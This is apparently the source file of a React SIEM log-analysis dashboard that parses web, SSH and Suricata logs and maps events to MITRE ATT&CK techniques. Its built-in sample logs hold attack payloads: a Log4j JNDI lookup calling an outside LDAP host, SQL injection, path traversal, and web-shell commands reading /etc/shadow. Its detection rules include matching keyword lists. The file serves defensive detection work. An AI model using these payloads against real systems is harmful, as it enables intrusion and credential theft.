import React, { useState, useMemo, useEffect } from 'react';
import { 
  FileCode, Play, Upload, Filter, Search, ShieldAlert, 
  AlertTriangle, ShieldCheck, Terminal, Copy, Check, 
  ExternalLink, Zap, RefreshCw, Layers, Shield, Database
} from 'lucide-react';

export interface ParsedSiemEvent {
  id: string;
  timestamp: string;
  sourceIp: string;
  sourcePort?: number;
  destinationIp?: string;
  destinationPort?: number;
  protocol: string;
  logType: 'WEB_ACCESS' | 'LINUX_AUTH' | 'SURICATA_EVE' | 'SYSLOG_CEF';
  summary: string;
  details: string;
  statusCode?: number;
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW' | 'INFO';
  mitreTechniqueId?: string;
  mitreTechniqueName?: string;
  mitreTactic?: string;
  matchedRule?: string;
  payloadSnippet?: string;
}

export const AUTHENTIC_BENCHMARK_LOGS = {
  web_exploits: `# Apache / Nginx Perimeter Reverse-Proxy Ingress - Active Exploit Wave
198.51.100.42 - - [12/Sep/2026:14:23:10 +0000] "GET /api/v1/search?q=\${jndi:ldap://198.51.100.42:1389/Exploit} HTTP/1.1" 400 324 "-" "Mozilla/5.0"
198.51.100.42 - - [12/Sep/2026:14:23:14 +0000] "GET /api/v1/search?q=\${jndi:dns://198.51.100.42/rce} HTTP/1.1" 400 312 "-" "Mozilla/5.0"
203.0.113.88 - - [12/Sep/2026:14:23:19 +0000] "GET /../../../../etc/passwd HTTP/1.1" 404 182 "-" "sqlmap/1.6"
203.0.113.88 - - [12/Sep/2026:14:23:25 +0000] "GET /cgi-bin/%%35%63%%35%63/winnt/system32/cmd.exe?/c+dir HTTP/1.1" 400 284 "-" "curl/7.88.1"
194.26.29.112 - - [12/Sep/2026:14:24:01 +0000] "GET /items?id=1' UNION SELECT username,password FROM users-- HTTP/1.1" 200 1842 "-" "python-requests/2.28.1"
194.26.29.112 - - [12/Sep/2026:14:24:05 +0000] "GET /items?id=1' AND (SELECT 9912 FROM (SELECT(SLEEP(5)))a)-- HTTP/1.1" 200 412 "-" "python-requests/2.28.1"
185.220.101.5 - - [12/Sep/2026:14:25:12 +0000] "POST /uploads/cmd.php?cmd=whoami HTTP/1.1" 200 512 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
185.220.101.5 - - [12/Sep/2026:14:25:30 +0000] "GET /shell.jsp?exec=cat+/etc/shadow HTTP/1.1" 500 128 "-" "Mozilla/5.0"
141.98.11.89 - - [12/Sep/2026:14:26:05 +0000] "GET /.env HTTP/1.1" 404 153 "-" "Go-http-client/1.1"
141.98.11.89 - - [12/Sep/2026:14:26:09 +0000] "GET /wp-config.php.bak HTTP/1.1" 404 162 "-" "Go-http-client/1.1"`,

  linux_auth: `# Linux /var/log/auth.log - SSH Credential Spray & Sudo Escalation
Sep 12 14:10:01 edge-bastion sshd[14210]: Failed password for root from 185.220.101.42 port 42110 ssh2
Sep 12 14:10:04 edge-bastion sshd[14212]: Failed password for root from 185.220.101.42 port 42118 ssh2
Sep 12 14:10:07 edge-bastion sshd[14215]: Failed password for invalid user admin from 185.220.101.42 port 42124 ssh2
Sep 12 14:10:11 edge-bastion sshd[14219]: Failed password for invalid user devops from 185.220.101.42 port 42130 ssh2
Sep 12 14:11:22 edge-bastion sshd[14301]: Failed password for invalid user deploy from 91.240.118.242 port 51004 ssh2
Sep 12 14:11:26 edge-bastion sshd[14305]: Failed password for invalid user deploy from 91.240.118.242 port 51010 ssh2
Sep 12 14:12:45 edge-bastion sudo: pam_unix(sudo:auth): authentication failure; logname=devuser uid=1001 euid=0 tty=/dev/pts/2 ruser=devuser rhost= user=root
Sep 12 14:13:00 edge-bastion sudo: devuser : 3 incorrect password attempts ; TTY=pts/2 ; PWD=/home/devuser ; USER=root ; COMMAND=/bin/bash
Sep 12 14:14:12 edge-bastion sshd[14450]: Accepted publickey for secops from 10.0.4.12 port 51220 ssh2: RSA SHA256:7vQx92kLmOPq
Sep 12 14:15:01 edge-bastion cron[14510]: (root) CMD (/usr/local/bin/integrity_audit.sh >/dev/null 2>&1)`,

  suricata_eve: `# Suricata EVE JSON Network Intrusion Sensor Logs
{"timestamp":"2026-09-12T14:15:22.124Z","flow_id":192847291,"event_type":"alert","src_ip":"198.51.100.42","src_port":44128,"dest_ip":"10.0.1.5","dest_port":80,"proto":"TCP","alert":{"action":"allowed","gid":1,"signature_id":2014726,"rev":4,"signature":"ET EXPLOIT Apache Log4j JNDI Exploit Attempt (CVE-2021-44228)","category":"Attempted Administrator Privilege Gain","severity":1},"http":{"hostname":"target.corp","url":"/api/v1/search?q=\${jndi:ldap://198.51.100.42:1389/Exploit}","http_user_agent":"curl/7.68.0"}}
{"timestamp":"2026-09-12T14:16:04.882Z","flow_id":192847340,"event_type":"alert","src_ip":"194.26.29.112","src_port":51294,"dest_ip":"10.0.1.5","dest_port":80,"proto":"TCP","alert":{"action":"allowed","gid":1,"signature_id":2009281,"rev":2,"signature":"ET WEB_SERVER Possible SQL Injection Attempt (UNION SELECT in URI)","category":"Web Application Attack","severity":2},"http":{"hostname":"target.corp","url":"/items?id=1%20UNION%20SELECT%20username,password","http_user_agent":"python-requests"}}
{"timestamp":"2026-09-12T14:18:33.451Z","flow_id":192847412,"event_type":"alert","src_ip":"185.220.101.5","src_port":38920,"dest_ip":"10.0.1.5","dest_port":80,"proto":"TCP","alert":{"action":"allowed","gid":1,"signature_id":2021004,"rev":1,"signature":"ET WEB_SERVER WebShell Ingress - Remote Command Execution (cmd.php)","category":"Web Application Attack","severity":1},"http":{"hostname":"target.corp","url":"/uploads/cmd.php?cmd=whoami","http_user_agent":"Mozilla/5.0"}}
{"timestamp":"2026-09-12T14:20:10.992Z","flow_id":192847550,"event_type":"alert","src_ip":"185.220.101.42","src_port":52110,"dest_ip":"10.0.1.2","dest_port":22,"proto":"TCP","alert":{"action":"allowed","gid":1,"signature_id":2001219,"rev":6,"signature":"ET SCAN Potential SSH Brute Force Ingress Detected","category":"Attempted Information Leak","severity":2}}`
};

interface SiemLogWorkbenchProps {
  onSelectIpForEnrichment: (ip: string) => void;
  onSelectForContainment: (ip: string, port?: number, reason?: string) => void;
  onEventsParsed?: (events: ParsedSiemEvent[]) => void;
}

export const SiemLogWorkbench: React.FC<SiemLogWorkbenchProps> = ({
  onSelectIpForEnrichment,
  onSelectForContainment,
  onEventsParsed,
}) => {
  const [rawInput, setRawInput] = useState<string>(AUTHENTIC_BENCHMARK_LOGS.web_exploits);
  const [events, setEvents] = useState<ParsedSiemEvent[]>([]);
  const [severityFilter, setSeverityFilter] = useState<'ALL' | 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW'>('ALL');
  const [statusFilter, setStatusFilter] = useState<'ALL' | '2xx' | '4xx' | '5xx'>('ALL');
  const [searchQuery, setSearchQuery] = useState<string>('');
  const [isInputCollapsed, setIsInputCollapsed] = useState<boolean>(false);
  const [copiedId, setCopiedId] = useState<string | null>(null);

  // Client-Side Deterministic Parser Engine with Sigma Detection Rules
  const parseLogs = (input: string) => {
    const lines = input.split('\n').map(l => l.trim()).filter(l => l && !l.startsWith('#'));
    const parsedList: ParsedSiemEvent[] = [];

    // Track SSH failure frequencies to detect brute force bursts (>2 failures from same IP)
    const sshFailuresByIp: { [ip: string]: number } = {};

    // First pass for aggregation
    lines.forEach(line => {
      if (line.includes('sshd') && line.includes('Failed password')) {
        const ipMatch = line.match(/from\s+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
        if (ipMatch) {
          const ip = ipMatch[1];
          sshFailuresByIp[ip] = (sshFailuresByIp[ip] || 0) + 1;
        }
      }
    });

    lines.forEach((line, idx) => {
      // 1. Suricata EVE JSON Format
      if (line.startsWith('{') && line.endsWith('}')) {
        try {
          const json = JSON.parse(line);
          const srcIp = json.src_ip || '127.0.0.1';
          const destIp = json.dest_ip || '0.0.0.0';
          const srcPort = json.src_port;
          const destPort = json.dest_port;
          const proto = json.proto || 'TCP';
          const alert = json.alert || {};
          const sig = alert.signature || 'Generic IDS Intercept';
          const category = alert.category || 'Network Anomaly';
          const sevNum = alert.severity || 3;
          
          let severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW' = 'MEDIUM';
          let mitreId = 'T1071';
          let mitreName = 'Standard Application Layer Protocol';
          let mitreTactic = 'Command and Control';

          if (sevNum === 1 || sig.toLowerCase().includes('exploit') || sig.toLowerCase().includes('log4j') || sig.toLowerCase().includes('webshell')) {
            severity = 'CRITICAL';
            mitreId = 'T1190';
            mitreName = 'Exploit Public-Facing Application';
            mitreTactic = 'Initial Access';
          } else if (sevNum === 2 || sig.toLowerCase().includes('sql') || sig.toLowerCase().includes('brute')) {
            severity = 'HIGH';
            mitreId = sig.toLowerCase().includes('brute') ? 'T1110' : 'T1190';
            mitreName = sig.toLowerCase().includes('brute') ? 'Brute Force' : 'Exploit Public-Facing Application';
            mitreTactic = sig.toLowerCase().includes('brute') ? 'Credential Access' : 'Initial Access';
          }

          parsedList.push({
            id: `eve-${idx}-${Date.now()}`,
            timestamp: json.timestamp ? new Date(json.timestamp).toLocaleTimeString() : new Date().toLocaleTimeString(),
            sourceIp: srcIp,
            sourcePort: srcPort,
            destinationIp: destIp,
            destinationPort: destPort,
            protocol: proto,
            logType: 'SURICATA_EVE',
            summary: sig,
            details: `Category: ${category} | SID: ${alert.signature_id || 'N/A'}`,
            severity,
            mitreTechniqueId: mitreId,
            mitreTechniqueName: mitreName,
            mitreTactic,
            matchedRule: `Suricata SID: ${alert.signature_id || 'N/A'}`,
            payloadSnippet: json.http?.url || json.payload_printable,
          });
          return;
        } catch (e) {
          // Fall through to text parsing
        }
      }

      // 2. Linux /var/log/auth.log Format
      if (line.includes('sshd[') || line.includes('sudo:') || line.includes('cron[')) {
        const timeMatch = line.match(/^([A-Z][a-z]{2}\s+\d+\s+\d{2}:\d{2}:\d{2})/);
        const timestamp = timeMatch ? timeMatch[1] : new Date().toLocaleTimeString();

        // SSH Failed Password
        if (line.includes('Failed password')) {
          const ipMatch = line.match(/from\s+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
          const portMatch = line.match(/port\s+(\d+)/);
          const userMatch = line.match(/for\s+(invalid user\s+)?([^\s]+)\s+from/);
          const ip = ipMatch ? ipMatch[1] : '192.0.2.1';
          const port = portMatch ? parseInt(portMatch[1], 10) : 22;
          const user = userMatch ? userMatch[2] : 'unknown';
          const isBurst = (sshFailuresByIp[ip] || 0) >= 3;

          parsedList.push({
            id: `auth-${idx}-${Date.now()}`,
            timestamp,
            sourceIp: ip,
            sourcePort: port,
            destinationPort: 22,
            protocol: 'SSH',
            logType: 'LINUX_AUTH',
            summary: isBurst ? `SSH Credential Brute-Force Burst (Target: ${user})` : `SSH Authentication Failure (Target: ${user})`,
            details: `Fail count from ${ip}: ${sshFailuresByIp[ip] || 1} attempts`,
            severity: isBurst ? 'HIGH' : 'MEDIUM',
            mitreTechniqueId: 'T1110.001',
            mitreTechniqueName: 'Brute Force: Password Guessing',
            mitreTactic: 'Credential Access',
            matchedRule: 'SIGMA: Linux SSH Failed Authentication Cluster',
            payloadSnippet: `User: ${user} | Port: ${port}`,
          });
          return;
        }

        // Sudo Escalation Failure
        if (line.includes('sudo:') && (line.includes('authentication failure') || line.includes('incorrect password'))) {
          const userMatch = line.match(/user=([^\s;]+)/) || line.match(/logname=([^\s;]+)/);
          const cmdMatch = line.match(/COMMAND=([^\s;]+)/);
          const user = userMatch ? userMatch[1] : 'unknown';

          parsedList.push({
            id: `sudo-${idx}-${Date.now()}`,
            timestamp,
            sourceIp: '127.0.0.1 (Local Host)',
            protocol: 'PAM_UNIX',
            logType: 'LINUX_AUTH',
            summary: 'Sudo Privilege Escalation Failure',
            details: cmdMatch ? `Attempted execution of ${cmdMatch[1]} as root` : 'Authentication failure for administrative escalation',
            severity: 'HIGH',
            mitreTechniqueId: 'T1548.003',
            mitreTechniqueName: 'Abuse Elevation Control Mechanism: Sudo and Sudo Caching',
            mitreTactic: 'Privilege Escalation',
            matchedRule: 'SIGMA: Sudo Root Elevation Failure',
            payloadSnippet: cmdMatch ? cmdMatch[1] : line,
          });
          return;
        }

        // SSH Successful Public Key Login
        if (line.includes('Accepted publickey')) {
          const ipMatch = line.match(/from\s+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
          const userMatch = line.match(/for\s+([^\s]+)\s+from/);
          parsedList.push({
            id: `auth-${idx}-${Date.now()}`,
            timestamp,
            sourceIp: ipMatch ? ipMatch[1] : '10.0.0.1',
            protocol: 'SSH',
            logType: 'LINUX_AUTH',
            summary: `SSH Key-Based Authentication Accepted (${userMatch ? userMatch[1] : 'user'})`,
            details: 'Authorized public key session established',
            severity: 'INFO',
            mitreTechniqueId: 'T1021.004',
            mitreTechniqueName: 'Remote Services: SSH',
            mitreTactic: 'Lateral Movement',
            matchedRule: 'BASELINE: Authorized SSH Ingress',
            payloadSnippet: line,
          });
          return;
        }
      }

      // 3. Web Access Logs (Apache / Nginx / IIS / Reverse Proxy)
      const ipMatch = line.match(/^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
      const ip = ipMatch ? ipMatch[1] : '198.51.100.1';

      const reqMatch = line.match(/"(GET|POST|PUT|DELETE|HEAD|OPTIONS)\s+([^"\s]+)\s+HTTP\/[0-9.]+"/i);
      const method = reqMatch ? reqMatch[1] : 'GET';
      const uri = reqMatch ? reqMatch[2] : '/';

      const statusMatch = line.match(/"\s+(\d{3})\s+/);
      const statusCode = statusMatch ? parseInt(statusMatch[1], 10) : 200;

      const timeMatch = line.match(/\[([^\]]+)\]/);
      const timestamp = timeMatch ? timeMatch[1].split(' ')[0] : new Date().toLocaleTimeString();

      let severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW' = 'LOW';
      let summary = `${method} ${uri}`;
      let mitreId = 'T1071.001';
      let mitreName = 'Application Layer Protocol: Web Protocols';
      let mitreTactic = 'Command and Control';
      let matchedRule = 'BASELINE: Standard HTTP Traffic';

      const lower = line.toLowerCase();

      // Sigma Rule 1: Log4j JNDI RCE
      if (lower.includes('jndi') || lower.includes('ldap://') || lower.includes('cve-2021-44228')) {
        severity = 'CRITICAL';
        summary = 'Apache Log4j JNDI Remote Code Execution Exploit Attempt';
        mitreId = 'T1190';
        mitreName = 'Exploit Public-Facing Application';
        mitreTactic = 'Initial Access';
        matchedRule = 'SIGMA: Log4j CVE-2021-44228 JNDI Injection Signature';
      }
      // Sigma Rule 2: Web Shell Execution
      else if (lower.includes('cmd.php') || lower.includes('shell.jsp') || lower.includes('c99.php') || lower.includes('whoami') || lower.includes('etc/shadow')) {
        severity = 'CRITICAL';
        summary = 'Web Shell Backdoor Access & Command Execution Probe';
        mitreId = 'T1505.003';
        mitreName = 'Server Software Component: Web Shell';
        mitreTactic = 'Persistence';
        matchedRule = 'SIGMA: Interactive Web Shell Execution Pattern';
      }
      // Sigma Rule 3: Path Traversal
      else if (lower.includes('..') || lower.includes('/etc/passwd') || lower.includes('system32') || lower.includes('%%35%63')) {
        severity = 'HIGH';
        summary = 'Directory Path Traversal / Arbitrary File Disclosure';
        mitreId = 'T1083';
        mitreName = 'File and Directory Discovery';
        mitreTactic = 'Discovery';
        matchedRule = 'SIGMA: Dot-Dot-Slash Arbitrary File Read Filter';
      }
      // Sigma Rule 4: SQL Injection
      else if (lower.includes('union') || lower.includes('select') || lower.includes('--') || lower.includes('sleep(') || lower.includes('sqlmap')) {
        severity = 'HIGH';
        summary = 'SQL Injection (Union / Blind / Timing)';
        mitreId = 'T1190';
        mitreName = 'Exploit Public-Facing Application';
        mitreTactic = 'Initial Access';
        matchedRule = 'SIGMA: Relational DB Injection Vector';
      }
      // Sigma Rule 5: Environment & Config Recon
      else if (lower.includes('.env') || lower.includes('wp-config') || lower.includes('setup.php')) {
        severity = 'MEDIUM';
        summary = 'Application Secret & Config Exposure Reconnaissance';
        mitreId = 'T1595.002';
        mitreName = 'Active Scanning: Vulnerability Scanning';
        mitreTactic = 'Reconnaissance';
        matchedRule = 'SIGMA: Hidden Dotfile & Credential Scraping';
      }

      parsedList.push({
        id: `web-${idx}-${Date.now()}`,
        timestamp,
        sourceIp: ip,
        destinationPort: 80,
        protocol: 'HTTP/1.1',
        logType: 'WEB_ACCESS',
        summary,
        details: `${method} ${uri} [Status: ${statusCode}]`,
        statusCode,
        severity,
        mitreTechniqueId: mitreId,
        mitreTechniqueName: mitreName,
        mitreTactic,
        matchedRule,
        payloadSnippet: uri,
      });
    });

    setEvents(parsedList);
    if (onEventsParsed) {
      onEventsParsed(parsedList);
    }
  };

  // Initial parse on load
  useEffect(() => {
    parseLogs(rawInput);
  }, []);

  // Filtered Events
  const filteredEvents = useMemo(() => {
    return events.filter(evt => {
      if (severityFilter !== 'ALL' && evt.severity !== severityFilter) return false;
      if (statusFilter !== 'ALL') {
        if (statusFilter === '2xx' && (!evt.statusCode || evt.statusCode < 200 || evt.statusCode >= 300)) return false;
        if (statusFilter === '4xx' && (!evt.statusCode || evt.statusCode < 400 || evt.statusCode >= 500)) return false;
        if (statusFilter === '5xx' && (!evt.statusCode || evt.statusCode < 500 || evt.statusCode >= 600)) return false;
      }
      if (searchQuery.trim()) {
        const q = searchQuery.toLowerCase();
        return (
          evt.sourceIp.toLowerCase().includes(q) ||
          evt.summary.toLowerCase().includes(q) ||
          evt.details.toLowerCase().includes(q) ||
          (evt.mitreTechniqueId && evt.mitreTechniqueId.toLowerCase().includes(q)) ||
          (evt.mitreTechniqueName && evt.mitreTechniqueName.toLowerCase().includes(q))
        );
      }
      return true;
    });
  }, [events, severityFilter, statusFilter, searchQuery]);

  // Metric Totals
  const metrics = useMemo(() => {
    const total = events.length;
    const critical = events.filter(e => e.severity === 'CRITICAL').length;
    const high = events.filter(e => e.severity === 'HIGH').length;
    const medium = events.filter(e => e.severity === 'MEDIUM').length;
    const low = events.filter(e => e.severity === 'LOW' || e.severity === 'INFO').length;
    const uniqueIps = new Set(events.map(e => e.sourceIp)).size;
    const uniqueTechniques = new Set(events.map(e => e.mitreTechniqueId).filter(Boolean)).size;

    return { total, critical, high, medium, low, uniqueIps, uniqueTechniques };
  }, [events]);

  return (
    <div className="flex-1 w-full h-full flex flex-col overflow-hidden bg-[#000000] font-mono text-neutral-200">
      {/* 1. Metric Header Bar */}
      <div className="p-3 bg-[#0a0a0a] border-b border-neutral-800 flex flex-wrap items-center justify-between gap-3 shrink-0">
        <div className="flex items-center gap-4 text-xs">
          <div className="flex items-center gap-2">
            <span className="w-2 h-2 rounded-none bg-emerald-500" />
            <span className="text-neutral-400 font-bold uppercase">SIEM INGESTION ENGINE:</span>
            <span className="text-white font-bold">{metrics.total} EVENTS</span>
          </div>

          <div className="h-4 w-[1px] bg-neutral-800 hidden sm:block" />

          <div className="flex items-center gap-2 text-xs">
            <span className="text-rose-400 font-bold">CRIT: {metrics.critical}</span>
            <span className="text-amber-400 font-bold">HIGH: {metrics.high}</span>
            <span className="text-blue-400 font-bold">MED: {metrics.medium}</span>
            <span className="text-neutral-500 font-bold">INFO: {metrics.low}</span>
          </div>

          <div className="h-4 w-[1px] bg-neutral-800 hidden md:block" />

          <div className="hidden md:flex items-center gap-3 text-xs text-neutral-400">
            <span>UNIQUE IOCs: <strong className="text-white">{metrics.uniqueIps}</strong></span>
            <span>ATT&CK TECHNIQUES: <strong className="text-cyan-400">{metrics.uniqueTechniques}</strong></span>
          </div>
        </div>

        <div className="flex items-center gap-2 text-xs">
          <button
            onClick={() => setIsInputCollapsed(!isInputCollapsed)}
            className="px-2.5 py-1 border border-neutral-800 bg-neutral-900 hover:bg-neutral-800 text-neutral-300 text-xs transition-colors cursor-pointer"
          >
            {isInputCollapsed ? '+ Show Raw Ingestion Tray' : '- Hide Ingestion Tray'}
          </button>
        </div>
      </div>

      {/* 2. Collapsible Log Ingestion Tray */}
      {!isInputCollapsed && (
        <div className="p-3 bg-[#050505] border-b border-neutral-800 shrink-0 space-y-2">
          <div className="flex flex-wrap items-center justify-between gap-2">
            <div className="flex items-center gap-2 text-xs">
              <span className="text-neutral-500 font-bold uppercase">AUTHENTIC BENCHMARK LOGS:</span>
              <button
                onClick={() => {
                  setRawInput(AUTHENTIC_BENCHMARK_LOGS.web_exploits);
                  parseLogs(AUTHENTIC_BENCHMARK_LOGS.web_exploits);
                }}
                className="px-2 py-0.5 border border-neutral-800 bg-neutral-900 hover:bg-neutral-800 text-neutral-300 text-[11px] cursor-pointer"
              >
                Log4j & Web Exploits
              </button>
              <button
                onClick={() => {
                  setRawInput(AUTHENTIC_BENCHMARK_LOGS.linux_auth);
                  parseLogs(AUTHENTIC_BENCHMARK_LOGS.linux_auth);
                }}
                className="px-2 py-0.5 border border-neutral-800 bg-neutral-900 hover:bg-neutral-800 text-neutral-300 text-[11px] cursor-pointer"
              >
                Linux SSH & Sudo Spray
              </button>
              <button
                onClick={() => {
                  setRawInput(AUTHENTIC_BENCHMARK_LOGS.suricata_eve);
                  parseLogs(AUTHENTIC_BENCHMARK_LOGS.suricata_eve);
                }}
                className="px-2 py-0.5 border border-neutral-800 bg-neutral-900 hover:bg-neutral-800 text-neutral-300 text-[11px] cursor-pointer"
              >
                Suricata EVE JSON
              </button>
            </div>

            <div className="flex items-center gap-2">
              <button
                onClick={() => parseLogs(rawInput)}
                className="px-3 py-1 bg-emerald-950/80 hover:bg-emerald-900 border border-emerald-800/80 text-emerald-300 text-xs font-bold flex items-center gap-1.5 transition-colors cursor-pointer"
              >
                <Play className="w-3 h-3 text-emerald-400" />
                <span>Execute Sigma Ingestion</span>
              </button>
            </div>
          </div>

          <textarea
            value={rawInput}
            onChange={(e) => setRawInput(e.target.value)}
            rows={4}
            placeholder="Paste raw Apache, Nginx, Linux /var/log/auth.log, or Suricata eve.json lines..."
            className="w-full p-2 bg-[#000000] border border-neutral-800 font-mono text-xs text-neutral-300 focus:outline-none focus:border-neutral-600 resize-y"
          />
        </div>
      )}

      {/* 3. Filter & Query Control Strip */}
      <div className="p-2.5 bg-[#0a0a0a] border-b border-neutral-800 flex flex-wrap items-center justify-between gap-3 shrink-0">
        <div className="flex flex-wrap items-center gap-2 text-xs">
          <div className="relative min-w-[240px]">
            <Search className="w-3.5 h-3.5 text-neutral-500 absolute left-2.5 top-1/2 -translate-y-1/2" />
            <input
              type="text"
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              placeholder="Search IP, URI, ATT&CK, or payload..."
              className="w-full pl-8 pr-3 py-1 bg-[#000000] border border-neutral-800 text-neutral-200 placeholder-neutral-600 text-xs focus:outline-none focus:border-neutral-600"
            />
          </div>

          {/* Severity Filters */}
          <div className="flex items-center border border-neutral-800">
            {(['ALL', 'CRITICAL', 'HIGH', 'MEDIUM', 'LOW'] as const).map(sev => (
              <button
                key={sev}
                onClick={() => setSeverityFilter(sev)}
                className={`px-2.5 py-1 text-[10px] font-bold uppercase transition-colors cursor-pointer ${
                  severityFilter === sev
                    ? 'bg-neutral-800 text-white'
                    : 'text-neutral-500 hover:text-neutral-300'
                }`}
              >
                {sev}
              </button>
            ))}
          </div>

          {/* Status Code Filter */}
          <div className="flex items-center border border-neutral-800">
            {(['ALL', '2xx', '4xx', '5xx'] as const).map(st => (
              <button
                key={st}
                onClick={() => setStatusFilter(st)}
                className={`px-2 py-1 text-[10px] font-bold uppercase transition-colors cursor-pointer ${
                  statusFilter === st
                    ? 'bg-neutral-800 text-white'
                    : 'text-neutral-500 hover:text-neutral-300'
                }`}
              >
                {st}
              </button>
            ))}
          </div>
        </div>

        <div className="text-xs text-neutral-500">
          Showing <strong className="text-white">{filteredEvents.length}</strong> of {events.length} events
        </div>
      </div>

      {/* 4. High-Density SIEM Events Table */}
      <div className="flex-1 overflow-auto bg-[#000000]">
        {filteredEvents.length === 0 ? (
          <div className="p-12 text-center text-xs text-neutral-600">
            No telemetry events matching current active filters.
          </div>
        ) : (
          <table className="w-full text-left text-xs border-collapse">
            <thead className="bg-[#050505] border-b border-neutral-800 text-[10px] uppercase text-neutral-500 sticky top-0 z-10">
              <tr>
                <th className="p-2.5 font-bold">TIMESTAMP</th>
                <th className="p-2.5 font-bold">SEVERITY</th>
                <th className="p-2.5 font-bold">SOURCE IOC</th>
                <th className="p-2.5 font-bold">DEST / PORT</th>
                <th className="p-2.5 font-bold">TYPE</th>
                <th className="p-2.5 font-bold">ATT&CK TECHNIQUE</th>
                <th className="p-2.5 font-bold">INCIDENT SUMMARY</th>
                <th className="p-2.5 font-bold text-right">ACTIONS</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-neutral-900 font-mono text-[11px]">
              {filteredEvents.map(evt => {
                const isCrit = evt.severity === 'CRITICAL';
                const isHigh = evt.severity === 'HIGH';
                const isMed = evt.severity === 'MEDIUM';

                return (
                  <tr 
                    key={evt.id}
                    className={`transition-colors hover:bg-neutral-950 ${
                      isCrit ? 'bg-rose-950/10' : isHigh ? 'bg-amber-950/10' : ''
                    }`}
                  >
                    <td className="p-2.5 text-neutral-400 whitespace-nowrap">
                      {evt.timestamp}
                    </td>

                    <td className="p-2.5 whitespace-nowrap">
                      <span className={`px-1.5 py-0.5 text-[9px] font-bold uppercase ${
                        isCrit
                          ? 'bg-rose-950 text-rose-300 border border-rose-800/60'
                          : isHigh
                          ? 'bg-amber-950 text-amber-300 border border-amber-800/60'
                          : isMed
                          ? 'bg-blue-950 text-blue-300 border border-blue-800/60'
                          : 'bg-neutral-900 text-neutral-400 border border-neutral-800'
                      }`}>
                        {evt.severity}
                      </span>
                    </td>

                    <td className="p-2.5 whitespace-nowrap">
                      <button
                        onClick={() => onSelectIpForEnrichment(evt.sourceIp)}
                        className="text-white hover:text-cyan-400 font-bold hover:underline cursor-pointer flex items-center gap-1"
                        title="Click to Enrich IOC via DoH PTR and CTI"
                      >
                        <span>{evt.sourceIp}</span>
                        <ExternalLink className="w-2.5 h-2.5 text-neutral-600" />
                      </button>
                    </td>

                    <td className="p-2.5 text-neutral-400 whitespace-nowrap">
                      {evt.destinationPort ? `Port ${evt.destinationPort}` : 'N/A'}
                    </td>

                    <td className="p-2.5 text-neutral-500 whitespace-nowrap text-[10px]">
                      {evt.logType}
                    </td>

                    <td className="p-2.5 whitespace-nowrap">
                      {evt.mitreTechniqueId ? (
                        <div className="flex items-center gap-1.5">
                          <span className="text-cyan-400 font-bold">{evt.mitreTechniqueId}</span>
                          <span className="text-neutral-500 text-[10px] truncate max-w-[140px]" title={evt.mitreTechniqueName}>
                            {evt.mitreTechniqueName}
                          </span>
                        </div>
                      ) : (
                        <span className="text-neutral-600">-</span>
                      )}
                    </td>

                    <td className="p-2.5 max-w-md">
                      <div className="font-bold text-neutral-200 truncate" title={evt.summary}>
                        {evt.summary}
                      </div>
                      <div className="text-[10px] text-neutral-500 truncate mt-0.5" title={evt.details}>
                        {evt.details}
                      </div>
                    </td>

                    <td className="p-2.5 text-right whitespace-nowrap">
                      <div className="flex items-center justify-end gap-1.5">
                        <button
                          onClick={() => onSelectIpForEnrichment(evt.sourceIp)}
                          className="px-2 py-0.5 border border-neutral-800 bg-neutral-900 hover:bg-neutral-800 text-neutral-300 text-[10px] cursor-pointer"
                          title="Enrich IOC"
                        >
                          Enrich
                        </button>
                        <button
                          onClick={() => onSelectForContainment(evt.sourceIp, evt.destinationPort, `${evt.summary} (${evt.mitreTechniqueId || 'T1071'})`)}
                          className="px-2 py-0.5 bg-rose-950/60 hover:bg-rose-900/80 border border-rose-800/80 text-rose-300 text-[10px] font-bold cursor-pointer"
                          title="Generate Containment Script"
                        >
                          Contain
                        </button>
                      </div>
                    </td>
                  </tr>
                );
              })}
            </tbody>
          </table>
        )}
      </div>
    </div>
  );
};
